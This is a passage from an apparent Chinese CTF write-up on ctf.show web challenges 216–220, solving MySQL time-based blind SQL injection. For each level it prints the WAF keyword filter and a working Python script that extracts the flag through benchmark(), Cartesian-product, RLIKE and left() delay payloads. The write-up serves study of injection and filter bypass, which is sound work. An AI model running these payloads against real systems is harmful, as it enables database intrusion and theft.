data-num="32"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>                             </pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="web-217-时间盲注benchmark"><a class="anchor" href="#web-217-时间盲注benchmark">#</a> web 217 时间盲注 —benchmark</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">benchmark</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>exp<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>select <span class="token function">benchmark</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span>expr<span class="token punctuation">)</span><span class="token punctuation">,</span>是重复执行count次expr表达式，使得处理时间很长，来产生 延迟，</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 查询语句</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>where id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 屏蔽危险分子</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		<span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sleep/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>测试语句</p>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152926031.png" alt="image-20220506152926031" /></p>
<p>一直会跑错，加 time . sleep () 休息一下，这样准确率就高了。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web217_benchmark.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/30 20:12 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://40e09a6d-88b0-462f-a9ae-e99790c0a9db.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment"># 查表名</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token comment"># 查列名字 - id.flag</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token comment"># 查数据</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(1000000,md5(1)),1)#"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="web-218-时间盲注笛卡尔积"><a class="anchor" href="#web-218-时间盲注笛卡尔积">#</a> web 218 时间盲注 — 笛卡尔积</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//where id = ($id);</span></pre></td></tr><tr><td data-num="3"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 屏蔽危险分子</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>      <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sleep|benchmark/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZm9yZm9yZXZlci9wLzEzMDE5NzAzLmh0bWw=">MySQL 时间盲注五种延时方法</span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web218_时间盲注延时方法.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/5/3 23:31 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://c8b913bf-dc53-44ad-8aff-a8b87b30e7c4.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token comment"># 查表名</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema = database()"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token comment"># 查列名字 - id.flag</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token comment"># 查数据</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token comment">#payload = "1) or if(ascii(substr((select flagaac from ctfshow_flagxc), &#123;&#125;,1))&lt;=&#123;&#125;, (concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,' a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'), rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad (1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),1)#"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from information_schema.columns A,information_schema.columns B),1)#"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token comment">#'ip': payload.format(i, mid),</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="web-219-时间盲注笛卡尔积"><a class="anchor" href="#web-219-时间盲注笛卡尔积">#</a> web 219 时间盲注 — 笛卡尔积</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre>where id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 屏蔽危险分子</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sleep|benchmark|rlike/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://5f6f00f6-f4f0-49a7-8743-5025da8dab67.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment"># 查表名</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema = database()"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment"># 查列名字 - id.flag</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxca'"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment"># 查数据</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxca"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment">#payload = "1) or if(ascii(substr((select flagaac from ctfshow_flagxc), &#123;&#125;,1))&lt;=&#123;&#125;, (concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,' a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'), rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad (1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),1)#"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from information_schema.columns A,information_schema.columns B),1)#"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token comment">#'ip': payload.format(i, mid),</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="web-220-时间盲注-left"><a class="anchor" href="#web-220-时间盲注-left">#</a> web 220 时间盲注 - left</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">LEFT</span> <span class="token constant">JOIN</span>（左连接）：获取左表所有记录，即使右表没有对应匹配的记录。</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">RIGHT</span> <span class="token constant">JOIN</span>（右连接）： 与 <span class="token constant">LEFT</span> <span class="token constant">JOIN</span> 相反，用于获取右表所有记录，即使左表没有对应匹配的记录</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">--</span>删除位置为<span class="token operator">-</span><span class="token number">1</span>的字符（也就是获取从位置<span class="token number">0</span>带位置<span class="token operator">-</span><span class="token number">1</span>之间的字符）</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre>where id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 屏蔽危险分子</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>测试语句<img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152859678.png" alt="image-20220506152859678" /></p>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152757256.png" alt="image-20220506152757256" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://cacdaa09-94d2-4ec9-8cdc-1dabe5c2bee8.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>strr <span class="token operator">=</span> <span class="token string">"_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp"</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">"select flagaabcc from ctfshow_flagxcac"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="9"></td><td><pre>res <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        res <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="13"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(left((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1)#"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment"># print(i)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            res <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            i<span class="token operator">+=</span><span class="token number">1</span></pre></td></tr></table></figure><h4 id="web-221-limit注入"><a class="anchor" href="#web-221-limit注入">#</a> web 221 limit 注入</h4>
